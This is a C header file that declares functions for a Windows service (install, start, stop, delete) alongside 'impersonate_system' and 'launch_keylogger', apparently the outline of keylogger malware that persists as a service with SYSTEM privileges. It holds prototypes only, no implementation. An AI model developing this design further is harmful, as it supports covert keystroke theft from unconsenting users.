#ifndef SERVICE_H
#define SERVICE_H

#include <windows.h>
#include <stdio.h>

void install_service(void);
void start_service(void);
void stop_service(void);
void delete_service(void);
VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceCtrlHandler(DWORD control);
BOOL impersonate_system(void);
void launch_keylogger(void);

#endif